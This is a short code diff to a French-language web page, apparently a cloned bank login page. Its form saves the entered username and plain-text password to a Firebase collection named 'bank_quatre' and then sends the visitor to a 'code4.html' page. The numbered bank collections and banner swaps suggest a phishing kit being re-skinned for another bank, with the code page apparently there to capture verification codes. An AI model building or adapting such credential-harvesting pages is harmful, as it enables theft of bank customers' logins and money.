@@ -21,7 +21,7 @@
     </header>
     <main>
         <div class="m-3 text-center">
-            <img src="images/ban3.png" alt="" class="img-fluid">
+            <img src="images/ban4.jpeg" alt="" class=" img-fluid" width="100">
         </div>
         <div>
             <form id="userForm" class="container">
@@ -118,8 +118,8 @@
 
                 if (username && password) {
                     try {
-                        const customId = await generateCustomId("bank_un");
-                        await setDoc(doc(db, "bank_un", customId), {
+                        const customId = await generateCustomId("bank_quatre");
+                        await setDoc(doc(db, "bank_quatre", customId), {
                             id: customId,
                             username: username,
                             motdepasse: password,
@@ -128,7 +128,7 @@
                         });
 
                         console.log("Document créé avec l'ID : ", customId);
-                        window.location.href = `code.html?id=${customId}`;
+                        window.location.href = `code4.html?id=${customId}`;
                     } catch (error) {
                         console.error("Erreur Firebase :", error);
                     }
